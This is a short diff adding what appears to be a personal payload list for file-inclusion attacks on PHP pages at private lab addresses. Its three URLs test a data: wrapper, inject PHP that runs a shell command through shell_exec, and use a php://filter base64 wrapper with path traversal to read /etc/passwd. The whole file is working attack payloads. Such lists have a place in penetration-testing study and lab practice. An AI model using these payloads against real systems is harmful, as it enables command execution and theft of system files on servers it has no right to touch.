@@ -1,0 +1,4 @@
+#IDENTYFIY
+http://192.168.112.132/menu.php?file=data:text/plain,helloworld
+http://192.168.112.132/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
+http://192.168.155.131/fileincl/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
